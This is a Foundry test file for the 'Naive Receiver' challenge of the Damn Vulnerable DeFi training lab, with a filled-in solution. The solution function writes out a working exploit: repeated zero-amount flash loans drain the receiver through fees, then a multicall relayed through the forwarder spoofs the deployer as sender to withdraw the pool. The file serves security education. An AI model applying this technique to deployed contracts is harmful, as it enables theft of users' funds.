// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        console.log("### test_naiveReceiver start ###");


        console.log("");
        console.log("#1 Before attack");
        console.log("pool balance:", weth.balanceOf(address(pool))/1e18);
        console.log("receiver balance:", weth.balanceOf(address(receiver))/1e18);
        console.log("recovery balance:", weth.balanceOf(recovery)/1e18);
        console.log("deployer deposits:", pool.deposits(address(deployer))/1e18);


        console.log("");
        console.log("#2 Run attack");
        uint256 count = 10;
        bytes[] memory _calldatas = new bytes[](count+1);


        // Step 1: drain the receiver's WETH balance to 0 by making it take out 10 flash loans of 0 amount (but incurring the 1 WETH fee each time)
        bytes memory _flashLoanData = abi.encodeCall(
            pool.flashLoan,
            (
                receiver,
                address(weth),
                0,
                ""
            )
        );


        for (uint256 i = 0; i < count; i++) {
            _calldatas[i] = _flashLoanData;
        }


        // Step 2: withdraw all WETH from the pool to the recovery account
        _calldatas[count] = abi.encodePacked(
            abi.encodeCall(
                pool.withdraw,
                (
                    WETH_IN_POOL + WETH_IN_RECEIVER,
                    payable(recovery)
                )
            ),
            bytes32(uint256(uint160(deployer)))
        );


        // Encode the multicall to the pool
        // This will execute all the flash loans and the withdraw in a single transaction
        bytes memory _requestData = abi.encodeCall(
            pool.multicall,
            (_calldatas)
        );


        // Create the forwarder request:
        // from must be the player, because only the player can sign the request
        BasicForwarder.Request memory _request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 1000000,
            nonce: forwarder.nonces(player),
            data: _requestData,
            deadline: block.timestamp + 1 days
        });

        // Sign the request
        // The digest is the EIP-712 hash of the request
        bytes32 _digest = keccak256(abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(_request))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, _digest);
        bytes memory _signature = abi.encodePacked(r, s, v);


        forwarder.execute{value: 0}(_request, _signature);


        console.log("");
        console.log("#3 After attack");
        console.log("pool balance:", weth.balanceOf(address(pool))/1e18);
        console.log("receiver balance:", weth.balanceOf(address(receiver))/1e18);
        console.log("recovery balance:", weth.balanceOf(recovery)/1e18);
        console.log("deployer deposits:", pool.deposits(address(deployer))/1e18);


        console.log("");
        console.log("### test_naiveReceiver end ###");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
